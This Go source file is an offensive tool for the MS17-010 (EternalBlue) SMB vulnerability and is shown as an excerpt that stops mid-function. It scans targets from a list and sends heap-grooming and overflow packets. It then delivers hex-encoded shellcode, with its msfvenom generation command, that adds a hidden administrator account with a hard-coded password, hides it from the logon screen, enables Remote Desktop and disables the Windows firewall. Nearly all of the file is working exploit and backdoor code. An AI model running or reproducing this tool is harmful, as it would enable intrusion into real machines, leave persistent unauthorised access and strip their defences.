// By Maptnh@S-H4CK13
// Phage for MS17-010 
// Auto Injection Hidden Backdoor & Bypass
// 2025-12-31
// msfvenom -p windows/x64/exec EXITFUNC=thread CMD='cmd.exe /c net user _SYSTEM_\$ "A9#fQ2!Z" /ADD && net localgroup Administrators _SYSTEM_\$ /ADD && REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v _SYSTEM_\$ /t REG_DWORD /d 0 /f && netsh advfirewall set allprofiles state off' -f hex
// Host-friendly: multiple injections without worrying about triggering a blue screen (except for Windows 32-bit)
// This tool keeps track of successfully injected hosts, meaning if you successfully inject once, it will not attempt a second exploit, thus preventing the host from crashing.

package main

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"flag"
	"io"
 "io/ioutil"
	"github.com/hirochachacha/go-smb2"
	"net"
	"strings"
	"time"
)
var cursor60 = "\033[60G"
var RED = "\033[31m"
var brightRed = "\033[91m"
var GREEN = "\033[1;32m"
var ORANGE = "\033[38;5;208m"
var RESET = "\033[0m"
var LOGO = strings.Join([]string{
	ORANGE+
    "              .",
    "           ,'/ \\`.",
    "          |\\/___\\/|",
    "          \\'\\   /``/",
    "           ``.\\ /,'",
    "  MS17-010    |    https://github.com/MartinxMax/",
    "Auto Injection|",
    "             |=|   Hidden Backdoor & Bypass",
    "        /\\  ,|=|.  /\\",
    "    ,'`.  \\/ |=| \\/  ,'`.",
    "  ,'    `.|\\ `-' /|,'    `.",
    ",'   .-._ \\ `---' / _,-.   `. Windows X64",
    "   ,'    `-`-._,-'-'    `.",
    "  '                       `",
	"Maptnh@S-H4CK13    		Ph4ge"+RESET,
}, "\n")

var (
	negotiateProtocolRequest, _   = hex.DecodeString("00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
	sessionSetupRequest, _        = hex.DecodeString("00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
	treeConnectRequest, _         = hex.DecodeString("00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
	transNamedPipeRequest, _      = hex.DecodeString("0000004aff534d42250000000018012800000000000000000000000000088ea3010852981000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00")
)

 
const (
    TIMEOUT  = 1 * time.Second
    USER     = "_SYSTEM_$"
    PASSWORD = "A9#fQ2!Z"
)

func CheckSMB(ip string, verbose bool) bool {
    if verbose {
        fmt.Println("[*] ["+GREEN+ip+RESET+"] Checking target SMB service....")
    }

    conn, err := net.DialTimeout("tcp", ip+":445", TIMEOUT)
    if err != nil {
        if verbose {
            fmt.Printf("[!] Connecting to target SMB service%s[%s FAIL %s] \n%v\n", cursor60, RED, RESET, err)
        }
        return false
    }

    if verbose {
        fmt.Printf("[+] ["+GREEN+ip+RESET+"] Connecting to target SMB service%s[%s DONE %s]\n", cursor60, GREEN, RESET)
    }
    defer conn.Close()

    d := &smb2.Dialer{
        Initiator: &smb2.NTLMInitiator{
            User:     USER,
            Password: PASSWORD,
        },
    }

    s, err := d.Dial(conn)
    if err != nil {
      if verbose {
        fmt.Printf("[!] ["+GREEN+ip+RESET+"] SMB session broken...%s[%s FAIL %s]\n", cursor60, RED, RESET)
      }
        return false
    }
    defer s.Logoff()

    _, err = s.Mount("Users")
    if err != nil {
      if verbose {
        fmt.Printf("[!] ["+GREEN+ip+RESET+"] SMB session broken...%s[%s FAIL %s]\n", cursor60, RED, RESET)
      }
        return false
    }

    if verbose {
        fmt.Printf("[+] ["+GREEN+ip+RESET+"] SMB session established successfully...%s[%s DONE %s]\n", cursor60, GREEN, RESET)
    }
    return true
}


func Exp(ip string) {
	x64 := "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5636d642e657865202f63206e65742075736572205f53595354454d5f5e242022413923665132215a22202f414444202626206e6574206c6f63616c67726f75702041646d696e6973747261746f7273205f53595354454d5f5e24202f41444420262620524547204144442022484b4c4d5c53595354454d5c43757272656e74436f6e74726f6c5365745c436f6e74726f6c5c5465726d696e616c2053657276657222202f76206644656e795453436f6e6e656374696f6e73202f74205245475f44574f5244202f642030202f6620262620524547204144442022484b4c4d5c534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c57696e6c6f676f6e5c5370656369616c4163636f756e74735c557365724c69737422202f76205f53595354454d5f5e24202f74205245475f44574f5244202f642030202f66202626206e65747368206164766669726577616c6c2073657420616c6c70726f66696c6573207374617465206f666600"
	payload,_ := hex.DecodeString(x64)
	err := eternalBlue(ip+":445", 20, 12, payload)
	if err != nil {
		return
	}
}
 
func Detect(ip string) int {
	conn, err := net.DialTimeout("tcp", ip+":445", 5*time.Second)
	if err != nil {
		return 0
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(5 * time.Second))
	conn.Write(negotiateProtocolRequest)
	reply := make([]byte, 1024)
	n, _ := conn.Read(reply)
	if n < 36 || binary.LittleEndian.Uint32(reply[9:13]) != 0 {
		return 0
	}
	conn.Write(sessionSetupRequest)
	n, _ = conn.Read(reply)
	if n < 36 || binary.LittleEndian.Uint32(reply[9:13]) != 0 {
		return 0
	}
	var os string
	sessionSetupResponse := reply[36:n]
	if wordCount := sessionSetupResponse[0]; wordCount != 0 {
		for i := 10; i < len(sessionSetupResponse)-1; i++ {
			if sessionSetupResponse[i] == 0 && sessionSetupResponse[i+1] == 0 {
				os = string(sessionSetupResponse[10:i])
				os = strings.Replace(os, string([]byte{0x00}), "", -1)
				break
			}
		}
	}
	userID := reply[32:34]
	treeConnectRequest[32] = userID[0]
	treeConnectRequest[33] = userID[1]
	conn.Write(treeConnectRequest)
	n, _ = conn.Read(reply)
	if n < 36 {
		return 0
	}
	treeID := reply[28:30]
	transNamedPipeRequest[28] = treeID[0]
	transNamedPipeRequest[29] = treeID[1]
	transNamedPipeRequest[32] = userID[0]
	transNamedPipeRequest[33] = userID[1]
	conn.Write(transNamedPipeRequest)
	n, _ = conn.Read(reply)
	if n < 36 {
		return 0
	}

 
	if reply[9] == 0x05 && reply[10] == 0x02 && reply[11] == 0x00 && reply[12] == 0xc0 {
		return 1
	} else {
		return 2
	}
}

func main() {
    var ipFlag string
    var ipsFile string
    var code int
    fmt.Println(LOGO)
    flag.StringVar(&ipFlag, "ip", "", "Specify a single IP address")
    flag.StringVar(&ipsFile, "ips", "", "Specify IP list file path")
    flag.Parse()

    var ips []string
    if ipFlag != "" {
        ips = append(ips, ipFlag)
    }
    if ipsFile != "" {
        data, err := ioutil.ReadFile(ipsFile)
        if err != nil {
            fmt.Printf("[!] Failed to read IPs file: %v\n", err)
            return
        }
        lines := strings.Split(string(data), "\n")
        for _, line := range lines {
            line = strings.TrimSpace(line)
            if line != "" {
                ips = append(ips, line)
            }
        }
    } 

    for _, currentIP := range ips {
        ok := CheckSMB(currentIP, true)
        if ok {
            fmt.Println("[+] ["+GREEN+currentIP+RESET+"] Target successfully injected, try remote desktop connection ["+brightRed+USER+":"+PASSWORD+RESET+"]")
        } else {
            code = Detect(currentIP)
            if code == 1 {
                fmt.Printf("[*] ["+GREEN+currentIP+RESET+"] Target appears to be injectable...%s[%s DONE %s]\n", cursor60, GREEN, RESET)
                for i := 0; i < 30; i++ {
                    Exp(currentIP)
                    time.Sleep(500 * time.Millisecond) 
                    if CheckSMB(currentIP, false) {
                        fmt.Printf("[!] ["+GREEN+currentIP+RESET+"] Attempting stack spraying, attempt %d  %s[%s DONE %s]\n", i+1, cursor60, GREEN, RESET)
                        fmt.Println("[+] ["+GREEN+currentIP+RESET+"] Target successfully injected, try remote desktop connection ["+brightRed+USER+":"+PASSWORD+RESET+"]")
                        break
                    } else {
                        fmt.Printf("[!] ["+GREEN+currentIP+RESET+"] Attempting stack spraying, attempt %d... %s[%s FAIL %s]\n", i+1, cursor60, RED, RESET)
                    }
                }
            }
        }
    }
}

// ===================================

const smbHeaderSize = 32
type smbHeader struct {
	ServerComponent [4]byte
	SMBCommand      uint8
	ErrorClass      uint8
	Reserved        byte
	ErrorCode       uint16
	Flags           uint8
	Flags2          uint16
	ProcessIDHigh   uint16
	Signature       [8]byte
	Reserved2       [2]byte
	TreeID          uint16
	ProcessID       uint16
	UserID          uint16
	MultiplexID     uint16
}

func eternalBlue(address string, initialGrooms, maxAttempts int, sc []byte) error {
	const maxscSize = packetMaxLen - packetSetupLen - len(loader) - 2 
	l := len(sc)
	if l > maxscSize {
		return fmt.Errorf("Buff size %d > %d big %d", l, maxscSize, l-maxscSize)
	}
	payload := makeKernelUserPayload(sc)
	var (
		grooms int
		err    error
	)
	for i := 0; i < maxAttempts; i++ {
		grooms = initialGrooms + 8*i
		err = exploit(address, grooms, payload)
		if err == nil {
			return nil
		}
		 time.Sleep(500 * time.Millisecond) 
	}
	return err
}

func exploit(address string, grooms int, payload []byte) error {
	header, conn, err := smb1AnonymousConnectIPC(address)
	if err != nil {
		return err
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	err = smb1LargeBuffer(conn, header)
	if err != nil {
		return err
	}
	fhsConn, err := smb1FreeHole(address, true)
	if err != nil {
		return err
	}
	defer func() { _ = fhsConn.Close() }()
	groomConns, err := smb2Grooms(address, grooms)
	if err != nil {
		return err
	}
	fhfConn, err := smb1FreeHole(address, false)
	if err != nil {
		return err
	}
	_ = fhsConn.Close()
	groomConns2, err := smb2Grooms(address, 6)
	if err != nil {
		return err
	}
	_ = fhfConn.Close()
	groomConns = append(groomConns, groomConns2...)
	defer func() {
		for i := 0; i < len(groomConns); i++ {
			_ = groomConns[i].Close()
		}
	}()
	err = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		return err
	}
	treeID := header.TreeID
	userID := header.UserID
	finalPacket := makeSMB1Trans2ExploitPacket(treeID, userID, 15, "exploit")
	_, err = conn.Write(finalPacket)
	if err != nil {
		return fmt.Errorf("failed to send final exploit packet: %s", err)
	}
	raw, _, err := smb1GetResponse(conn)
	if err != nil {
		return fmt.Errorf("failed to get response about exploit: %s", err)
	}
	ntStatus := make([]byte, 4)
	ntStatus[0] = raw[8]
	ntStatus[1] = raw[7]
	ntStatus[2] = raw[6]
	ntStatus[3] = raw[5]
	body := makeSMB2Body(payload)
	for i := 0; i < len(groomConns); i++ {
		_, err = groomConns[i].Write(body[:2920])
		if err != nil {
			return err
		}
	}
	for i := 0; i < len(groomConns); i++ {
		_, err = groomConns[i].Write(body[2920:4073])
		if err != nil {
			return err
		}
	}
	return nil
}

func makeKernelUserPayload(sc []byte) []byte {
	buf := bytes.Buffer{}
	buf.Write(loader[:])
	size := make([]byte, 2)
	binary.LittleEndian.PutUint16(size, uint16(len(sc)))
	buf.Write(size)
	buf.Write(sc)
	return buf.Bytes()
}

func smb1AnonymousConnectIPC(address string) (*smbHeader, net.Conn, error) {
	conn, err := net.DialTimeout("tcp", address, 10*time.Second)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to connect host: %s", err)
	}
	var ok bool
	defer func() {
		if !ok {
			_ = conn.Close()
		}
	}()
	err = smbClientNegotiate(conn)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to negotiate: %s", err)
	}
	raw, header, err := smb1AnonymousLogin(conn)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to login with anonymous: %s", err)
	}
	_, err = getOSName(raw)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to get OS name: %s", err)
	}
	header, err = treeConnectAndX(conn, address, header.UserID)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to tree connect AndX: %s", err)
	}
	ok = true
	return header, conn, nil
}


func smb1GetResponse(conn net.Conn) ([]byte, *smbHeader, error) {
	buf := make([]byte, 4)
	_, err := io.ReadFull(conn, buf)
	if err != nil {
		const format = "failed to get SMB1 response about NetBIOS session service: %s"
		return nil, nil, fmt.Errorf(format, err)
	}
	typ := buf[0]
	if typ != 0x00 {
		const format = "invalid message type 0x%02X in SMB1 response"
		return nil, nil, fmt.Errorf(format, typ)
	}
	sizeBuf := make([]byte, 4)
	copy(sizeBuf[1:], buf[1:])
	size := int(binary.BigEndian.Uint32(sizeBuf))
	// SMB
	buf = make([]byte, size)
	_, err = io.ReadFull(conn, buf)
	if err != nil {
		const format = "failed to get SMB1 response about header: %s"
		return nil, nil, fmt.Errorf(format, err)
	}
	smbHeader := smbHeader{}
	reader := bytes.NewReader(buf[:smbHeaderSize])
	err = binary.Read(reader, binary.LittleEndian, &smbHeader)
	if err != nil {
		const format = "failed to parse SMB1 response header: %s"
		return nil, nil, fmt.Errorf(format, err)
	}
	return buf, &smbHeader, nil
}

func smbClientNegotiate(conn net.Conn) error {
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// message type
	buf.WriteByte(0x00)
	// length
	buf.Write([]byte{0x00, 0x00, 0x54})

	// --------Server Message Block Protocol--------

	// server_component: .SMB
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// smb_command: Negotiate Protocol
	buf.WriteByte(0x72)
	// NT status
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// flags
	buf.WriteByte(0x18)
	// flags2
	buf.Write([]byte{0x01, 0x28})
	// process_id_high
	buf.Write([]byte{0x00, 0x00})
	// signature
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// tree id
	buf.Write([]byte{0x00, 0x00})
	// process id
	buf.Write([]byte{0x2F, 0x4B})
	// user id
	buf.Write([]byte{0x00, 0x00})
	// multiplex id
	buf.Write([]byte{0xC5, 0x5E})

	// --------Negotiate Protocol Request--------

	// word_count
	buf.WriteByte(0x00)
	// byte_count
	buf.Write([]byte{0x31, 0x00})

	// dialect name: LAN MAN1.0
	buf.WriteByte(0x02)
	buf.Write([]byte{0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E,
		0x30, 0x00})

	// dialect name: LM1.2X002
	buf.WriteByte(0x02)
	buf.Write([]byte{0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30,
		0x32, 0x00})

	// dialect name: NT LAN MAN 1.0
	buf.WriteByte(0x02)
	buf.Write([]byte{0x4E, 0x54, 0x20, 0x4C, 0x41, 0x4E, 0x4D, 0x41,
		0x4E, 0x20, 0x31, 0x2E, 0x30, 0x00})

	// dialect name: NT LM 0.12
	buf.WriteByte(0x02)
	buf.Write([]byte{0x4E, 0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E,
		0x31, 0x32, 0x00})

	// send packet
	_, err := buf.WriteTo(conn)
	if err != nil {
		return err
	}
	_, _, err = smb1GetResponse(conn)
	return err
}

func smb1AnonymousLogin(conn net.Conn) ([]byte, *smbHeader, error) {
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// session message
	buf.WriteByte(0x00)
	// length
	buf.Write([]byte{0x00, 0x00, 0x88})

	// --------Server Message Block Protocol--------

	// SMB1
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Session Setup AndX
	buf.WriteByte(0x73)
	// NT SUCCESS
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// flags
	buf.WriteByte(0x18)
	// flags2
	buf.Write([]byte{0x07, 0xC0})
	// PID high
	buf.Write([]byte{0x00, 0x00})
	// Signature1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Signature2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// TreeID
	buf.Write([]byte{0x00, 0x00})
	// PID
	buf.Write([]byte{0xFF, 0xFE})
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// user id
	buf.Write([]byte{0x00, 0x00})
	// multiplex id
	buf.Write([]byte{0x40, 0x00})

	// --------Session Setup AndX Request--------

	// word count
	buf.WriteByte(0x0D)
	// no further commands
	buf.WriteByte(0xFF)
	// reserved
	buf.WriteByte(0x00)
	// AndX offset
	buf.Write([]byte{0x88, 0x00})
	// max buffer
	buf.Write([]byte{0x04, 0x11})
	// max mpx count
	buf.Write([]byte{0x0A, 0x00})
	// VC Number
	buf.Write([]byte{0x00, 0x00})
	// session key
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// ANSI password length
	buf.Write([]byte{0x01, 0x00})
	// unicode password length
	buf.Write([]byte{0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// capabilities
	buf.Write([]byte{0xD4, 0x00, 0x00, 0x00})
	// bytes count
	buf.Write([]byte{0x4b, 0x00})
	// ANSI password
	buf.WriteByte(0x00)
	// account name
	buf.Write([]byte{0x00, 0x00})
	// domain name
	buf.Write([]byte{0x00, 0x00})

	// native OS: Windows 2000 2195
	buf.Write([]byte{0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00,
		0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32})
	buf.Write([]byte{0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20,
		0x00, 0x32, 0x00, 0x31, 0x00, 0x39, 0x00, 0x35, 0x00})
	buf.Write([]byte{0x00, 0x00})

	// native LAN manager: Windows 2000 5.0
	buf.Write([]byte{0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00,
		0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32})
	buf.Write([]byte{0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20,
		0x00, 0x35, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x00, 0x00})

	// send packet
	_, err := buf.WriteTo(conn)
	if err != nil {
		return nil, nil, err
	}
	return smb1GetResponse(conn)
}

// skip smb header, word count, AndXCommand, Reserved,
// AndXOffset, Action, Byte count and a magic 0x41 (A)
func getOSName(raw []byte) (string, error) {
	osBuf := bytes.Buffer{}
	reader := bytes.NewReader(raw[smbHeaderSize+10:])
	char := make([]byte, 2)
	for {
		_, err := io.ReadFull(reader, char)
		if err != nil {
			return "", err
		}
		if bytes.Equal(char, []byte{0x00, 0x00}) {
			break
		}
		osBuf.Write(char)
	}
	osBufLen := osBuf.Len()
	osName := make([]byte, 0, osBufLen/2)
	b := osBuf.Bytes()
	for i := 0; i < osBufLen; i += 2 {
		osName = append(osName, b[i])
	}
	return string(osName), nil
}

func treeConnectAndX(conn net.Conn, address string, userID uint16) (*smbHeader, error) {
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// message type
	buf.WriteByte(0x00)
	// length, it will changed at the end of the function
	buf.Write([]byte{0x00, 0x00, 0x00})

	// --------Server Message Block Protocol--------

	// server component
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// smb command: Tree Connect AndX
	buf.WriteByte(0x75)
	// NT status
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// flags
	buf.WriteByte(0x18)
	// flags2
	buf.Write([]byte{0x01, 0x20})
	// process id high
	buf.Write([]byte{0x00, 0x00})
	// signature
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// tree id
	buf.Write([]byte{0x00, 0x00})
	// process id
	buf.Write([]byte{0x2F, 0x4B})
	// user id
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)
	// multiplex id
	buf.Write([]byte{0xC5, 0x5E})

	// --------Tree Connect AndX Request--------

	// word count
	buf.WriteByte(0x04)
	// AndXCommand: No further commands
	buf.WriteByte(0xFF)
	// reserved
	buf.WriteByte(0x00)
	// AndXOffset
	buf.Write([]byte{0x00, 0x00})
	// flags
	buf.Write([]byte{0x00, 0x00})
	// password length
	buf.Write([]byte{0x01, 0x00})
	// byte count
	buf.Write([]byte{0x1A, 0x00})
	// password
	buf.WriteByte(0x00)
	// IPC
	host, _, err := net.SplitHostPort(address)
	if err != nil {
		return nil, err
	}
	_, _ = fmt.Fprintf(&buf, "\\\\%s\\IPC$", host)
	// null byte after ipc added by kev
	buf.WriteByte(0x00)
	// service
	buf.Write([]byte{0x3F, 0x3F, 0x3F, 0x3F, 0x3F, 0x00})

	// update packet size
	b := buf.Bytes()
	sizeBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(sizeBuf, uint32(buf.Len()-4))
	copy(b[1:], sizeBuf[1:])

	// send packet
	_, err = buf.WriteTo(conn)
	if err != nil {
		return nil, err
	}
	_, header, err := smb1GetResponse(conn)
	return header, err
}

func smb1LargeBuffer(conn net.Conn, header *smbHeader) error {
	transHeader, err := sendNTTrans(conn, header.TreeID, header.UserID)
	if err != nil {
		return fmt.Errorf("failed to send nt trans: %s", err)
	}
	// initial trans2 request
	treeID := transHeader.TreeID
	userID := transHeader.UserID
	trans2Packet := makeSMB1Trans2ExploitPacket(treeID, userID, 0, "zero")
	// send all but the last packet
	for i := 1; i < 15; i++ {
		packet := makeSMB1Trans2ExploitPacket(treeID, userID, i, "buffer")
		trans2Packet = append(trans2Packet, packet...)
	}
	smb1EchoPacket := makeSMB1EchoPacket(treeID, userID)
	trans2Packet = append(trans2Packet, smb1EchoPacket...)

	_, err = conn.Write(trans2Packet)
	if err != nil {
		return fmt.Errorf("failed to send large buffer: %s", err)
	}
	_, _, err = smb1GetResponse(conn)
	return err
}

func sendNTTrans(conn net.Conn, treeID, userID uint16) (*smbHeader, error) {
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// message type
	buf.WriteByte(0x00)
	// length
	buf.Write([]byte{0x00, 0x04, 0x38})

	// --------Server Message Block Protocol--------

	// SMB1
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// NT Trans
	buf.WriteByte(0xA0)
	// NT success
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// flags
	buf.WriteByte(0x18)
	// flags2
	buf.Write([]byte{0x07, 0xC0})
	// PID high
	buf.Write([]byte{0x00, 0x00})
	// signature1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// signature2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// tree id
	treeIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(treeIDBuf, treeID)
	buf.Write(treeIDBuf)
	// PID
	buf.Write([]byte{0xFF, 0xFE})
	// user id
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)
	// multiplex id
	buf.Write([]byte{0x40, 0x00})

	// --------NT Trans Request--------

	// word count
	buf.WriteByte(0x14)
	// max setup count
	buf.WriteByte(0x01)
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// total param count
	buf.Write([]byte{0x1E, 0x00, 0x00, 0x00})
	// total data count
	buf.Write([]byte{0xd0, 0x03, 0x01, 0x00})
	// max param count
	buf.Write([]byte{0x1E, 0x00, 0x00, 0x00})
	// max data count
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// param count
	buf.Write([]byte{0x1E, 0x00, 0x00, 0x00})
	// param offset
	buf.Write([]byte{0x4B, 0x00, 0x00, 0x00})
	// data count
	buf.Write([]byte{0xd0, 0x03, 0x00, 0x00})
	// data offset
	buf.Write([]byte{0x68, 0x00, 0x00, 0x00})
	// setup count
	buf.WriteByte(0x01)
	// function <unknown>
	buf.Write([]byte{0x00, 0x00})
	// unknown NT transaction (0) setup
	buf.Write([]byte{0x00, 0x00})
	// byte count
	buf.Write([]byte{0xEC, 0x03})
	// NT parameters
	buf.Write(makeZero(0x1F))
	// undocumented
	buf.WriteByte(0x01)
	buf.Write(makeZero(0x03CD))

	// send packet
	_, err := buf.WriteTo(conn)
	if err != nil {
		return nil, err
	}
	_, header, err := smb1GetResponse(conn)
	return header, err
}

func makeSMB1Trans2ExploitPacket(treeID, userID uint16, timeout int, typ string) []byte {
	timeout = timeout*0x10 + 3
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// message type
	buf.WriteByte(0x00)
	// length
	buf.Write([]byte{0x00, 0x10, 0x35})

	// --------Server Message Block Protocol--------
	// SMB1
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Trans2 request
	buf.WriteByte(0x33)
	// NT success
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// flags
	buf.WriteByte(0x18)
	// flags2
	buf.Write([]byte{0x07, 0xC0})
	// PID high
	buf.Write([]byte{0x00, 0x00})
	// signature1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// signature2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// tree id
	treeIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(treeIDBuf, treeID)
	buf.Write(treeIDBuf)
	// PID
	buf.Write([]byte{0xFF, 0xFE})
	// user id
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)
	// multiplex id
	buf.Write([]byte{0x40, 0x00})

	// --------Trans2 Second Request--------

	// word count
	buf.WriteByte(0x09)
	// total param count
	buf.Write([]byte{0x00, 0x00})
	// total data count
	buf.Write([]byte{0x00, 0x10})
	// max param count
	buf.Write([]byte{0x00, 0x00})
	// max data count
	buf.Write([]byte{0x00, 0x00})
	// max setup count
	buf.WriteByte(0x00)
	// reserved
	buf.WriteByte(0x00)
	// flags
	buf.Write([]byte{0x00, 0x10})
	// timeouts
	buf.Write([]byte{0x35, 0x00, 0xD0})
	// timeout is a single int
	buf.WriteByte(byte(timeout))
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// parameter count
	buf.Write([]byte{0x00, 0x10})

	switch typ {
	case "exploit":
		// overflow
		buf.Write(bytes.Repeat([]byte{0x41}, 2957))
		buf.Write([]byte{0x80, 0x00, 0xA8, 0x00})

		buf.Write(makeZero(0x10))
		buf.Write([]byte{0xFF, 0xFF})
		buf.Write(makeZero(0x06))
		buf.Write([]byte{0xFF, 0xFF})
		buf.Write(makeZero(0x16))

		// x86 addresses
		buf.Write([]byte{0x00, 0xF1, 0xDF, 0xFF})
		buf.Write(makeZero(0x08))
		buf.Write([]byte{0x20, 0xF0, 0xDF, 0xFF})

		// x64 addresses
		buf.Write([]byte{0x00, 0xF1, 0xDF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})

		buf.Write([]byte{0x60, 0x00, 0x04, 0x10})
		buf.Write(makeZero(0x04))

		buf.Write([]byte{0x80, 0xEF, 0xDF, 0xFF})

		buf.Write(makeZero(0x04))
		buf.Write([]byte{0x10, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
		buf.Write([]byte{0x18, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
		buf.Write(makeZero(0x10))

		buf.Write([]byte{0x60, 0x00, 0x04, 0x10})
		buf.Write(makeZero(0x0C))
		buf.Write([]byte{0x90, 0xFF, 0xCF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
		buf.Write(makeZero(0x08))
		buf.Write([]byte{0x80, 0x10})
		buf.Write(makeZero(0x0E))
		buf.WriteByte(0x39)
		buf.WriteByte(0xBB)

		buf.Write(bytes.Repeat([]byte{0x41}, 965))
	case "zero":
		buf.Write(makeZero(2055))
		buf.Write([]byte{0x83, 0xF3})

		buf.Write(bytes.Repeat([]byte{0x41}, 2039))
	default:
		buf.Write(bytes.Repeat([]byte{0x41}, 4096))
	}
	return buf.Bytes()
}

func makeSMB1EchoPacket(treeID, userID uint16) []byte {
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// message type
	buf.WriteByte(0x00)
	// length
	buf.Write([]byte{0x00, 0x00, 0x31})

	// --------Server Message Block Protocol--------
	// SMB1
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Echo
	buf.WriteByte(0x2B)
	// NT success
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// flags
	buf.WriteByte(0x18)
	// flags2
	buf.Write([]byte{0x07, 0xC0})
	// PID high
	buf.Write([]byte{0x00, 0x00})
	// signature1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// signature2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// tree id
	treeIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(treeIDBuf, treeID)
	buf.Write(treeIDBuf)
	// PID
	buf.Write([]byte{0xFF, 0xFE})
	// user id
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
